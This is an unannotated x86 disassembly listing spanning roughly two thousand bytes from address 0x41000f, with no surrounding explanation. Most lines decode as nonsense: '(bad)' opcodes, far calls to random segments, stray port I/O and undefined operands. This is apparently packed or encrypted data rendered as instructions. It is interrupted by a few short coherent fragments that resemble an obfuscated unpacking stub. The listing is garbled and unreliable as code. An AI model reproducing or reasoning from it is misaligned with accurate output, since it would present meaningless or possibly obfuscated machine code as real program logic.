  41000f:	cmp    eax,0x7904fdc4
  410014:	enter  0xc94b,0x3
  410018:	xchg   edx,eax
  410019:	push   ss
  41001a:	mov    eax,0xc9237d6a
  41001f:	mov    ds:0xab29cd2c,eax
  410024:	sbb    ecx,DWORD PTR [edi-0x21e02dd3]
  41002a:	push   edi
  41002b:	xor    eax,0x5c16b54b
  410030:	cmp    esi,DWORD PTR [ecx]
  410032:	paddw  mm0,QWORD PTR [ebx+0x32]
  410036:	dec    ecx
  410037:	or     al,0xba
  410039:	pop    ss
  41003a:	jl     0x4100ac
  41003c:	(bad)  
  41003e:	sub    BYTE PTR [esi-0x48d70db5],ch
  410044:	call   0x8236:0xf0337423
  41004b:	cs or  al,0x40
  41004e:	sub    eax,DWORD PTR [eax-0x28]
  410051:	push   0x60
  410053:	ret    0x67a3
  410056:	int3   
  410057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410058:	or     BYTE PTR [ebx],0x2
  41005b:	pop    ebx
  41005c:	sti    
  41005d:	dec    ebp
  41005e:	pop    ebx
  41005f:	lds    edx,FWORD PTR [ecx+0x63]
  410062:	add    bh,BYTE PTR [bp+0x63]
  410066:	or     eax,0x664038e7
  41006b:	dec    edx
  41006c:	pop    ds
  41006d:	call   0xda425d35
  410072:	xchg   esi,eax
  410073:	xchg   ecx,eax
  410074:	test   BYTE PTR [eax-0x6a5483d0],ch
  41007a:	jmp    0xc95a01d
  41007f:	adc    DWORD PTR [edi+eax*2-0x247a4377],ecx
  410086:	jecxz  0x410070
  410088:	mov    dh,0xc5
  41008a:	mov    eax,0xfe072dec
  41008f:	lock xchg ebp,eax
  410091:	popa   
  410092:	into   
  410093:	mov    bh,0xf5
  410095:	fld    TBYTE PTR [ebx]
  410097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410098:	jp     0x4100f2
  41009a:	daa    
  41009b:	mov    ecx,0x2e5821d3
  4100a0:	leave  
  4100a1:	fs inc edx
  4100a3:	int3   
  4100a4:	sub    bh,BYTE PTR [esi+0x2cc0079e]
  4100aa:	aas    
  4100ab:	fcomp  QWORD PTR [edx+0x26bfab4d]
  4100b1:	cmc    
  4100b2:	inc    ebx
  4100b3:	push   ebx
  4100b4:	pop    ebp
  4100b5:	hlt    
  4100b6:	add    DWORD PTR [ebx+0xf],ebp
  4100b9:	add    bh,BYTE PTR [eax]
  4100bb:	xlat   BYTE PTR ds:[ebx]
  4100bc:	jl     0x410129
  4100be:	push   ds
  4100bf:	dec    esi
  4100c1:	sbb    ebp,DWORD PTR [eax-0x49]
  4100c4:	aaa    
  4100c5:	xchg   esp,eax
  4100c6:	scas   eax,DWORD PTR es:[edi]
  4100c7:	xchg   ecx,eax
  4100c8:	push   edx
  4100c9:	fwait
  4100ca:	sbb    al,0x5d
  4100cc:	inc    edi
  4100cd:	nop
  4100ce:	mov    BYTE PTR ds:0x13a9efdb,ch
  4100d4:	ja     0x4100e2
  4100d6:	sub    al,0x7a
  4100d8:	sar    DWORD PTR ds:0xab4befa4,1
  4100de:	enter  0xfe28,0x4e
  4100e2:	dec    edx
  4100e3:	outs   dx,BYTE PTR ds:[esi]
  4100e4:	cwde   
  4100e5:	mov    bh,ch
  4100e7:	jae    0x4100c9
  4100e9:	and    ch,BYTE PTR [esi]
  4100eb:	sahf   
  4100ec:	jmp    0xbe376108
  4100f1:	push   ebp
  4100f2:	adc    esp,0xffffffed
  4100f5:	test   DWORD PTR [esp+edx*1+0xa883026],0xbd9dfa58
  410100:	inc    eax
  410101:	icebp  
  410102:	mov    dh,0xe9
  410104:	adc    esi,DWORD PTR [edx+0x6273ddfa]
  41010a:	call   0x4b072a6f
  41010f:	aas    
  410110:	xchg   edx,eax
  410111:	add    BYTE PTR [eax],cl
  410113:	lods   al,BYTE PTR ds:[esi]
  410114:	in     eax,dx
  410115:	dec    ecx
  410116:	mov    edx,0x66359b46
  41011b:	dec    eax
  41011c:	xchg   ecx,eax
  41011d:	mov    bl,0x7d
  41011f:	pop    eax
  410120:	retf   
  410121:	rep outs dx,DWORD PTR ds:[esi]
  410123:	retf   
  410124:	(bad)  
  410125:	dec    esp
  410126:	adc    DWORD PTR [edx-0x62],esi
  410129:	gs inc edx
  41012b:	xchg   ebp,eax
  41012c:	addr16 add eax,0x309be3d6
  410132:	fucomp st(4)
  410134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410135:	(bad)  
  410136:	mov    ss,esi
  410138:	imul   ecx,ebx,0x8424a9b
  41013e:	or     edx,edx
  410140:	repz adc DWORD PTR ds:0x10fc76cc,0x9a60d96
  41014b:	push   eax
  41014c:	dec    edx
  41014d:	sbb    eax,0x40e33e3f
  410152:	test   al,0xbb
  410154:	mov    dh,0x8a
  410156:	int    0xa6
  410158:	add    ah,BYTE PTR [ebp-0x7669ccaf]
  41015e:	dec    esp
  41015f:	push   eax
  410160:	dec    ebx
  410161:	adc    al,0xa0
  410163:	cmc    
  410164:	add    edi,DWORD PTR [edi-0x11]
  410167:	jb     0x41010a
  410169:	cs cld 
  41016b:	cwde   
  41016c:	inc    edx
  41016d:	ins    DWORD PTR es:[edi],dx
  41016e:	addr16 cmp eax,0x776bde33
  410174:	fstp   DWORD PTR [ecx-0x36]
  410177:	mov    ebp,0x830aad50
  41017c:	cli    
  41017d:	xchg   ebp,eax
  41017e:	je     0x41015f
  410180:	(bad)
  410184:	loop   0x410201
  410186:	cmp    cl,BYTE PTR [ecx+0x4bbea8a7]
  41018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018d:	dec    edi
  41018e:	enter  0xe58e,0x6d
  410192:	or     ebx,DWORD PTR [esi]
  410194:	(bad)  
  410195:	pop    esi
  410196:	fyl2xp1 
  410198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410199:	cwde   
  41019a:	dec    ax
  41019c:	mov    eax,ds:0xdcacda20
  4101a1:	test   BYTE PTR [ebp+ecx*8-0x44],ch
  4101a5:	out    dx,eax
  4101a6:	cmp    bl,BYTE PTR [ebx]
  4101a8:	push   edi
  4101a9:	pushf  
  4101aa:	out    dx,al
  4101ab:	jnp    0x410223
  4101ad:	cmc    
  4101ae:	shl    BYTE PTR [edi+0x66f0c541],0x66
  4101b5:	iret   
  4101b6:	xor    DWORD PTR [ecx+eax*4-0x24bfcc36],eax
  4101bd:	sbb    eax,0xb0419e27
  4101c2:	mov    WORD PTR [esi+0x3],fs
  4101c5:	push   edi
  4101c6:	mov    edi,0xa3315f44
  4101cb:	inc    ebp
  4101cc:	stc    
  4101cd:	mov    ?,esi
  4101cf:	stos   DWORD PTR es:[edi],eax
  4101d0:	and    BYTE PTR [edi],bl
  4101d2:	imul   ebp,ebp,0x65ae4b9
  4101d8:	arpl   WORD PTR [edx-0x2acc353d],dx
  4101de:	bound  esp,QWORD PTR [ebx]
  4101e0:	adc    eax,0x8186f3a5
  4101e5:	call   0x2063:0xc9d6e53b
  4101ec:	dec    eax
  4101ed:	cmp    esp,ebp
  4101ef:	call   0xc24538f2
  4101f4:	cmp    DWORD PTR [ecx+0x7343d4f9],ebp
  4101fa:	mov    ch,0xe9
  4101fc:	pop    esp
  4101fd:	ins    BYTE PTR es:[edi],dx
  4101fe:	rol    DWORD PTR [eax-0x4a],1
  410201:	xchg   ebx,eax
  410202:	push   ebp
  410203:	push   0x64
  410205:	data16 ja 0x410243
  410208:	(bad)  
  410209:	in     eax,dx
  41020a:	pop    ebx
  41020b:	das    
  41020c:	inc    edx
  41020d:	adc    eax,0x939b254c
  410212:	cli    
  410213:	mov    bh,0xf0
  410215:	cli    
  410216:	gs repnz retf 0x1366
  41021b:	aas    
  41021c:	cmp    BYTE PTR [esi+0x14],ch
  41021f:	test   bh,cl
  410221:	adc    DWORD PTR [ecx-0x40e7b3a6],ebp
  410227:	retf   0x1583
  41022a:	in     al,0x97
  41022c:	out    dx,al
  41022d:	addr16 jl 0x4101b9
  410230:	daa    
  410231:	jo     0x410229
  410233:	cs cwde 
  410235:	xlat   BYTE PTR ds:[ebx]
  410236:	in     eax,0x72
  410238:	scas   al,BYTE PTR es:[edi]
  410239:	mov    ebp,0x998dd423
  41023e:	xchg   edi,eax
  41023f:	or     DWORD PTR [ecx+0x5760d29f],ebx
  410245:	jecxz  0x41022e
  410247:	or     dl,ch
  410249:	sbb    al,BYTE PTR [esi]
  41024b:	pop    ss
  41024c:	inc    ebp
  41024d:	adc    BYTE PTR [ebx],bh
  41024f:	shl    BYTE PTR [eax+edx*2-0x49],1
  410253:	adc    DWORD PTR [edx-0x3b654102],0xffffffd8
  41025a:	jl     0x410268
  41025c:	mov    ah,0xa4
  41025e:	icebp  
  41025f:	dec    ebx
  410260:	jp     0x410212
  410262:	mov    al,ds:0x7f39516c
  410267:	adc    dh,BYTE PTR [esi+0x50]
  41026a:	push   es
  41026b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41026d:	inc    esi
  41026e:	cld    
  41026f:	mov    ch,0x42
  410271:	aad    0xb
  410273:	dec    ecx
  410274:	imul   edi,DWORD PTR [edx],0xffffffba
  410277:	xchg   ecx,eax
  410278:	dec    esi
  410279:	mov    ah,0x3
  41027b:	jne    0x410254
  41027d:	push   edx
  41027e:	pop    ebx
  41027f:	push   ss
  410280:	in     al,0x4b
  410282:	inc    ecx
  410283:	or     al,0x2b
  410285:	mov    ch,0x2b
  410287:	adc    dh,BYTE PTR [edx+0x46831cd4]
  41028d:	inc    ebp
  41028e:	add    bh,dl
  410290:	test   DWORD PTR [ecx+0x1e],eax
  410293:	enter  0x88a,0xf5
  410297:	mov    bl,0x97
  410299:	mov    ch,0xda
  41029b:	mov    edi,0x7e7cc47c
  4102a0:	mov    WORD PTR [ebx+esi*1-0xfed2815],?
  4102a7:	adc    bh,BYTE PTR [edx]
  4102a9:	sub    BYTE PTR [ebx-0x17cebfde],cl
  4102af:	or     ebp,DWORD PTR [ecx]
  4102b1:	imul   edx,DWORD PTR [ebp-0x35],0x10ff8ece
  4102b8:	dec    eax
  4102b9:	xor    al,0x90
  4102bb:	pop    ds
  4102bc:	retf   
  4102bd:	aad    0x8e
  4102bf:	add    DWORD PTR [ebp-0x7a],esi
  4102c2:	cmp    BYTE PTR [ebp-0x2da113cd],bl
  4102c8:	mov    bl,0x71
  4102ca:	push   ebp
  4102cb:	sbb    bh,BYTE PTR [esi-0x62247014]
  4102d1:	out    0x18,eax
  4102d3:	fisubr WORD PTR [edx-0x6490fb38]
  4102d9:	mov    bh,0xa7
  4102db:	mov    eax,cs
  4102dd:	pop    ebx
  4102de:	js     0x4102e0
  4102e0:	mov    ds:0x52694ca4,al
  4102e5:	jge    0x410300
  4102e7:	imul   ebx,edx,0x77
  4102ea:	ret    0xdffa
  4102ed:	mov    esi,0xf0701630
  4102f2:	mov    al,0xbf
  4102f4:	je     0x41031b
  4102f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102f7:	cmp    ah,BYTE PTR [edx-0x77]
  4102fa:	out    0xd1,al
  4102fc:	or     ebp,DWORD PTR [edi-0x1a]
  4102ff:	jo     0x4102ac
  410301:	jp     0x4102c6
  410303:	stos   BYTE PTR es:[edi],al
  410304:	test   eax,0x49e13f4c
  410309:	pop    ebp
  41030a:	mov    WORD PTR [esi-0x4],?
  41030d:	(bad)  
  41030e:	fnsave [edx+0x7317502d]
  410314:	mul    DWORD PTR [esi-0x45]
  410317:	push   0x52f05cf2
  41031c:	daa    
  41031d:	xor    BYTE PTR [esi],bl
  41031f:	(bad)  
  410320:	stc    
  410321:	bound  edx,QWORD PTR [eax+ebx*2]
  410324:	(bad)  
  410325:	push   ecx
  410326:	jge    0x4102c6
  410328:	jmp    0xf543:0x98fbe6aa
  41032f:	fdiv   st(6),st
  410331:	push   ds
  410332:	xor    al,0x83
  410334:	ret    0xb9f8
  410337:	fdiv   DWORD PTR [edx+0x5d]
  41033a:	mov    esp,DWORD PTR [ebp-0x79]
  41033d:	fisttp WORD PTR [ebx]
  41033f:	(bad)  
  410340:	push   esi
  410341:	je     0x4103b8
  410343:	popf   
  410344:	sub    BYTE PTR [eax],cl
  410346:	mov    edi,0x7260d344
  41034b:	and    BYTE PTR [ecx],cl
  41034d:	sbb    ebp,eax
  41034f:	mov    ch,0xe
  410351:	push   eax
  410352:	mov    WORD PTR [ebp-0x331cde6],ss
  410358:	xchg   edx,eax
  410359:	mov    ecx,0xda6ff88a
  41035e:	mov    ds:0x38f90dec,al
  410363:	push   eax
  410364:	xor    BYTE PTR [esi+0x1d],dh
  410367:	nop
  410368:	popa   
  410369:	aam    0x74
  41036b:	rcl    BYTE PTR [esi+0x3],1
  41036e:	mov    ch,0xef
  410370:	in     eax,0x12
  410372:	mov    DWORD PTR [ebx-0x3a],edi
  410375:	adc    ch,ah
  410377:	xlat   BYTE PTR es:[ebx]
  410379:	loopne 0x410315
  41037b:	add    edx,DWORD PTR [ebx]
  41037d:	in     eax,0xc6
  41037f:	in     al,0xb4
  410381:	(bad)  
  410382:	pop    es
  410383:	jecxz  0x410365
  410385:	lock adc eax,0x9402f0c5
  41038b:	push   0x48
  41038d:	fnsave [ecx-0x68f78aca]
  410393:	xor    cl,BYTE PTR [ecx]
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x4658:0x8e28bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	jmp    0x4103c9
  4103dc:	push   es
  4103dd:	or     eax,0x1c8059ce
  4103e2:	enter  0xc359,0xa5
  4103e6:	sar    esp,0x96
  4103e9:	push   ss
  4103ea:	mov    bh,0x8c
  4103ec:	in     eax,dx
  4103ed:	adc    cl,cl
  4103ef:	mov    ch,0x2b
  4103f1:	jle    0x41039e
  4103f3:	(bad)  
  4103f4:	clc    
  4103f5:	mov    WORD PTR [ebx-0x12],?
  4103f8:	push   ds
  4103f9:	pushf  
  4103fa:	sub    eax,0xf6784e0f
  4103ff:	fisttp WORD PTR [eax]
  410401:	mov    bh,bl
  410403:	jmp    0x41040a
  410405:	jns    0x410464
  410407:	pop    ds
  410408:	sbb    edi,ebp
  41040a:	dec    ebx
  41040b:	sbb    eax,0xc00dbd67
  410410:	imul   ebp,ebp,0x1e5e168
  410416:	call   0x327c:0xa752ac38
  41041d:	mov    bh,0xa8
  41041f:	add    ebx,esi
  410421:	lea    ebx,[ecx+0x2c]
  410424:	inc    ebx
  410425:	stc    
  410426:	fwait
  410427:	aaa    
  410428:	int    0x8d
  41042a:	outs   dx,DWORD PTR ds:[esi]
  41042b:	cld    
  41042c:	pop    edi
  41042d:	je     0x410480
  41042f:	sti    
  410430:	sti    
  410431:	push   ebx
  410432:	push   ebx
  410433:	mov    al,ds:0x5485ccfd
  410438:	scas   eax,DWORD PTR es:[edi]
  410439:	ins    DWORD PTR es:[edi],dx
  41043a:	enter  0x5d09,0xe0
  41043e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41043f:	int3   
  410440:	lea    edi,[ebx+0x68]
  410443:	xor    al,0xe0
  410445:	xor    ebp,esi
  410447:	leave  
  410448:	clc    
  410449:	xor    al,0xe2
  41044b:	sub    al,0xc5
  41044d:	fdiv   DWORD PTR [ecx+0x19dd45eb]
  410453:	loopne 0x4104be
  410455:	and    DWORD PTR [ecx+edi*4-0x62],ebp
  410459:	push   ss
  41045a:	and    al,0x5
  41045c:	mov    esi,0x8d67a46b
  410461:	test   DWORD PTR [ebx+0x30],ebp
  410464:	mov    dh,0x4a
  410466:	leave  
  410467:	xor    eax,0x6642503e
  41046c:	pop    ebx
  41046d:	xchg   edx,eax
  41046e:	aaa    
  41046f:	sub    dl,BYTE PTR [eax+0x30adba66]
  410475:	in     al,0x7b
  410477:	lea    ebx,[ebp+edi*8+0x617a67fc]
  41047e:	mov    ebp,0x16a167f
  410483:	popf   
  410484:	aad    0x46
  410486:	jnp    0x410470
  410488:	mov    al,BYTE PTR [ebx+0x5c87af6a]
  41048e:	sar    BYTE PTR [edx-0x4e],1
  410491:	xor    DWORD PTR [edi],ebx
  410493:	in     al,0x6
  410495:	push   es
  410496:	sub    al,0xc5
  410498:	mul    DWORD PTR [edx-0x6244422e]
  41049e:	mov    esp,0x5ee5d03c
  4104a3:	xor    DWORD PTR [edi+0x1d],eax
  4104a6:	mov    ch,0xc2
  4104a8:	xor    eax,0xb01f71cb
  4104ad:	imul   edx,DWORD PTR [ebx-0x59],0x71b38acc
  4104b4:	stos   DWORD PTR es:[edi],eax
  4104b5:	mov    ds:0xd7771449,eax
  4104ba:	lock inc eax
  4104bc:	fcomp  DWORD PTR [ebp-0x16]
  4104bf:	(bad)
  4104c3:	enter  0x3f4e,0x60
  4104c7:	pop    ebx
  4104c8:	dec    esp
  4104c9:	fs push es
  4104cb:	ins    BYTE PTR es:[edi],dx
  4104cc:	add    DWORD PTR [ebx+0x615811d6],esp
  4104d2:	fcom   QWORD PTR [esi-0x6b]
  4104d5:	sub    al,0xf3
  4104d7:	mov    edi,0x9fe69a5a
  4104dc:	int3   
  4104dd:	imul   eax,DWORD PTR [edi+0x409409c0],0xffffffd5
  4104e4:	push   cs
  4104e5:	mov    BYTE PTR [ecx-0x2aa95f1d],0xb5
  4104ec:	lds    eax,FWORD PTR [eax]
  4104ee:	mov    esp,0x99017500
  4104f3:	and    al,0x10
  4104f5:	adc    BYTE PTR [ecx+edx*4-0x28b03161],ah
  4104fc:	mov    dl,0xd5
  4104fe:	aam    0xdc
  410500:	cmp    BYTE PTR [esi-0x5bcdbcee],dl
  410506:	mov    ah,0x76
  410508:	int3   
  410509:	call   0xcb8bb3b0
  41050e:	add    eax,0x35c8b9e0
  410513:	imul   ebx,DWORD PTR [eax+eax*1+0x34],0xcc84bc8b
  41051b:	jae    0x410553
  41051d:	push   ebx
  41051e:	jbe    0x4104b0
  410520:	rcl    BYTE PTR [ebp+0x50f9435d],1
  410526:	ror    edi,cl
  410528:	sbb    ch,bl
  41052a:	and    edx,DWORD PTR [ebx+edx*8]
  41052d:	fadd   DWORD PTR [ebp+0x465f32d4]
  410533:	(bad)  
  410535:	jecxz  0x410536
  410537:	push   esp
  410538:	sub    cl,BYTE PTR [edi+0x67]
  41053b:	xchg   edx,eax
  41053c:	sbb    edx,DWORD PTR [ebx+0x6c]
  41053f:	out    0xcc,eax
  410541:	outs   dx,BYTE PTR ds:[esi]
  410542:	jb     0x410563
  410544:	sti    
  410545:	out    dx,eax
  410546:	sbb    ebx,esi
  410548:	cli    
  410549:	imul   edx,DWORD PTR [edx-0x5a],0x37
  41054d:	mov    bl,0xcf
  41054f:	cmp    bh,cl
  410551:	jno    0x41053c
  410553:	jae    0x4104ef
  410555:	jle    0x4105a1
  410557:	idiv   BYTE PTR [esi]
  410559:	cli    
  41055a:	bnd ret 0x9e50
  41055e:	push   edi
  41055f:	aam    0x24
  410561:	inc    ebp
  410562:	clc    
  410563:	test   BYTE PTR [ebx],ah
  410565:	add    DWORD PTR [eax],edx
  410567:	push   0xffffffbd
  410569:	cmp    esp,eax
  41056b:	imul   ebp,ebx,0x580fb869
  410571:	adc    eax,DWORD PTR [esi+ebx*4+0x5a]
  410575:	out    dx,al
  410576:	sbb    al,0x67
  410578:	sbb    dl,BYTE PTR [esi+0x6b]
  41057b:	daa    
  41057c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41057e:	scas   al,BYTE PTR es:[edi]
  41057f:	scas   al,BYTE PTR es:[edi]
  410580:	les    ecx,FWORD PTR [ecx+esi*4]
  410583:	sub    BYTE PTR [esi-0x26],ah
  410586:	dec    ebp
  410587:	pop    ecx
  410588:	std    
  410589:	mov    edi,0xfb1357b5
  41058e:	ret    
  41058f:	stos   BYTE PTR es:[edi],al
  410590:	sub    edi,esi
  410592:	xor    al,0xf4
  410594:	mov    ch,0x8d
  410596:	in     eax,dx
  410597:	out    dx,al
  410598:	inc    ebx
  410599:	ret    
  41059a:	xchg   ebx,eax
  41059b:	ret    0xb4a7
  41059e:	rep outs dx,DWORD PTR ds:[esi]
  4105a0:	test   al,0x4d
  4105a2:	jb     0x410586
  4105a4:	push   ebp
  4105a5:	sbb    dh,BYTE PTR [ebx]
  4105a7:	adc    esp,DWORD PTR [esi+eax*2+0x7cee0ec2]
  4105ae:	or     edx,DWORD PTR [esp+esi*8]
  4105b1:	push   ebp
  4105b2:	dec    ebx
  4105b3:	mov    esp,0x7d38a365
  4105b8:	mov    esi,0xb28f8e93
  4105bd:	mov    ch,0x19
  4105bf:	pop    ss
  4105c0:	inc    ebp
  4105c1:	jae    0x410549
  4105c3:	nop    DWORD PTR [eax+0x8fc47fa]
  4105ca:	cmp    al,0x27
  4105cc:	sub    ch,BYTE PTR [ecx+0x2117f73f]
  4105d2:	sahf   
  4105d3:	push   edx
  4105d4:	mov    ah,0x66
  4105d6:	mov    ds,WORD PTR [esi+0x450c6244]
  4105dc:	mov    eax,0x34e7af20
  4105e1:	mov    esi,0x4577bb6d
  4105e6:	jnp    0x410650
  4105e8:	jb     0x4105fe
  4105ea:	(bad)  
  4105eb:	mov    eax,ds:0x953e677e
  4105f0:	push   ss
  4105f1:	pop    ss
  4105f2:	mov    ch,0x60
  4105f4:	push   0x7fdc29a6
  4105f9:	jmp    0xf6f5:0x1fae39a7
  410600:	jne    0x410637
  410602:	dec    esp
  410603:	retf   0x33f8
  410606:	cmp    eax,0x592cc70b
  41060b:	test   BYTE PTR ss:[edx-0x40],dh
  41060f:	lds    ecx,FWORD PTR [eax]
  410611:	dec    ebx
  410612:	pushf  
  410613:	aam    0x3
  410615:	sbb    BYTE PTR [ecx+0x28e24ff2],cl
  41061b:	out    0x40,al
  41061d:	jecxz  0x410683
  41061f:	sub    eax,0x5a0463cc
  410624:	sub    DWORD PTR [edi+0x2796033d],0xffffffab
  41062b:	imul   ebx,DWORD PTR ds:0x57254fb2,0xb
  410632:	and    ebp,DWORD PTR [ecx-0x65]
  410635:	jecxz  0x41069c
  410637:	dec    ecx
  410638:	mov    ch,0x41
  41063a:	jno    0x410658
  41063c:	sub    BYTE PTR [edi],al
  41063e:	call   0xbb52:0x90bc3e48
  410645:	dec    edi
  410646:	cwde   
  410647:	lods   eax,DWORD PTR ds:[esi]
  410648:	aas    
  410649:	adc    eax,0xfcaff11
  41064e:	mov    esp,0xd27976ac
  410653:	loopne 0x410624
  410655:	test   al,0xd3
  410657:	call   0x853a:0xbc9b47e7
  41065e:	mov    al,ds:0xb4eeb2fc
  410663:	xchg   edi,eax
  410664:	aam    0xa8
  410666:	mov    dh,al
  410668:	and    DWORD PTR fs:[ecx+0x4e],ebp
  41066c:	or     ah,dh
  41066e:	mov    edi,0xadaee406
  410673:	stc    
  410674:	in     eax,dx
  410675:	xchg   esi,eax
  410676:	ror    esi,cl
  410678:	lds    eax,FWORD PTR [ebx+0x7e]
  41067b:	inc    ebx
  41067c:	data16 fstp DWORD PTR [ecx-0x2e]
  410680:	dec    edi
  410681:	push   cs
  410682:	(bad)  
  410683:	dec    edx
  410684:	and    DWORD PTR [esp+ebx*8],0x590b422f
  41068b:	test   DWORD PTR [bp+di],edx
  41068e:	jbe    0x410630
  410690:	addr16 inc esp
  410692:	inc    esp
  410693:	div    BYTE PTR [ecx+0x6c]
  410696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410697:	push   ds
  410698:	sbb    al,BYTE PTR [esi]
  41069a:	fld    DWORD PTR [eax]
  41069c:	repnz fnstenv [eax]
  41069f:	out    dx,eax
  4106a0:	xchg   ebp,eax
  4106a1:	mov    bh,0x7a
  4106a3:	sbb    eax,0x96e35c5d
  4106a8:	shr    DWORD PTR [edx+0x1],0x61
  4106ac:	jo     0x41070e
  4106ae:	push   esp
  4106af:	jno    0x41065f
  4106b1:	dec    esi
  4106b2:	mul    BYTE PTR [ecx]
  4106b4:	out    dx,al
  4106b5:	inc    esi
  4106b6:	ins    DWORD PTR es:[edi],dx
  4106b7:	push   edx
  4106b8:	mov    ds:0x92d485ef,eax
  4106bd:	pop    es
  4106be:	push   ebp
  4106bf:	aaa    
  4106c0:	and    BYTE PTR ds:0x84e4ec6a,ah
  4106c6:	rol    BYTE PTR [ebx+0x9cc027f],0xad
  4106cd:	push   ebp
  4106ce:	icebp  
  4106cf:	inc    esp
  4106d0:	mov    esp,0x2f5a8a0c
  4106d5:	pop    ss
  4106d6:	mov    eax,0x95639de4
  4106db:	cs stos BYTE PTR es:[edi],al
  4106dd:	inc    ecx
  4106de:	daa    
  4106df:	scas   eax,DWORD PTR es:[edi]
  4106e0:	lds    esp,FWORD PTR [ecx]
  4106e2:	xchg   esp,eax
  4106e3:	xchg   edx,eax
  4106e4:	clc    
  4106e5:	popa   
  4106e6:	xchg   edx,eax
  4106e7:	add    DWORD PTR [ecx],0xffffffb7
  4106ea:	jo     0x4106eb
  4106ec:	outs   dx,BYTE PTR ds:[esi]
  4106ed:	test   BYTE PTR [ebp+0x75],al
  4106f0:	mov    ch,0xe1
  4106f2:	(bad)  
  4106f3:	fdivp  st(1),st
  4106f5:	mov    WORD PTR [edi+ebx*8-0x6e6b4aac],?
  4106fc:	test   al,0x84
  4106fe:	and    eax,DWORD PTR [ecx+0x63]
  410701:	jp     0x4106c4
  410703:	xchg   ecx,eax
  410704:	pop    edi
  410705:	cmp    DWORD PTR [edx+0x31],0x16
  410709:	iret   
  41070a:	rcl    DWORD PTR ds:0xf23e202f,0x4f
  410711:	pushf  
  410712:	sbb    al,al
  410714:	mov    dl,al
  410716:	inc    ebp
  410717:	sbb    edx,0xa29d9c33
  41071d:	push   ss
  41071e:	ins    DWORD PTR es:[edi],dx
  41071f:	xchg   ebp,eax
  410720:	pop    es
  410721:	pop    DWORD PTR [edi-0x601b138b]
  410727:	dec    eax
  410728:	(bad)  
  410729:	iret   
  41072a:	push   ds
  41072b:	xchg   edi,eax
  41072c:	xchg   esi,eax
  41072d:	jmp    0x621d:0x8575f054
  410734:	mov    ebp,0x53a98213
  410739:	push   0x29
  41073b:	cmp    al,0xd
  41073d:	xchg   BYTE PTR [edi+eax*2],bl
  410740:	retf   
  410741:	cmp    ah,BYTE PTR [ebp+0x26]
  410744:	push   0x69
  410746:	ins    BYTE PTR es:[edi],dx
  410747:	loopne 0x4106f8
  410749:	call   0x4e0c65f
  41074e:	pusha  
  41074f:	call   0xdd22f79b
  410754:	loopne 0x410755
  410756:	jmp    FWORD PTR [ebx]
  410758:	pop    es
  410759:	push   ebp
  41075a:	add    eax,0xcfde4ed8
  41075f:	repnz stos DWORD PTR es:[edi],eax
  410761:	shl    DWORD PTR [eax+0x2b],1
  410764:	shl    DWORD PTR [ebx-0x1e2e7644],cl
  41076a:	jp     0x41072a
  41076c:	xchg   esp,eax
  41076d:	popa   
  41076e:	mov    edx,0xfaa7d5a
  410773:	jl     0x410771
  410775:	jg     0x4107b1
  410777:	mov    ds:0xdccdab17,al
  41077c:	sub    cl,BYTE PTR [ebx-0x2b9ac29e]
  410782:	outs   dx,DWORD PTR ds:[esi]
  410783:	(bad)  
  410785:	inc    ecx
  410786:	xchg   DWORD PTR [ebx-0x267ef78b],ecx
  41078c:	es das 
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	mov    DWORD PTR [edx+0x468bf8d5],0x7da37070
  4107b2:	jo     0x410824
  4107b4:	(bad)  
  4107b5:	cli    
  4107b6:	adc    BYTE PTR [edx],ah
  4107b8:	push   0xd
  4107ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107bb:	fldenv [ecx+0x2ee1606e]
  4107c1:	mov    ds:0xbbc41132,eax
  4107c6:	push   0x72
  4107c8:	mov    WORD PTR [edi+0x30],?
  4107cb:	sbb    BYTE PTR [edi+0x41c2a1bd],dh
  4107d1:	js     0x4107b7
  4107d3:	aaa    
  4107d4:	xor    BYTE PTR [edx-0x60],cl
  4107d7:	sbb    ebx,DWORD PTR [eax+eiz*2+0x7a]
  4107db:	lea    ecx,[ebp-0x2a]
  4107de:	and    DWORD PTR [ecx+0x1622733],ecx
  4107e4:	jne    0x41080d
  4107e6:	push   ecx
  4107e7:	cmp    bh,al
  4107e9:	out    dx,eax
  4107ea:	ficomp WORD PTR [eax-0x7db48e33]
  4107f0:	ins    BYTE PTR es:[edi],dx
  4107f1:	push   0xdd17a4d2
  4107f6:	jl     0x41080d
  4107f8:	sbb    edx,ebx
  4107fa:	sub    DWORD PTR [edx+eax*8+0x18e0fde5],ebx
  410801:	leave  
  410802:	jae    0x410846
  410804:	dec    ebp
  410805:	dec    ecx
  410806:	adc    cl,BYTE PTR [eax+0x351dc3be]
  41080c:	out    dx,al
  41080d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080e:	mov    al,ds:0x6fca9d39
  410813:	add    ch,BYTE PTR [ebp-0x5c]
  410816:	xchg   ebp,eax
  410817:	aad    0x96
  410819:	out    0x6c,eax
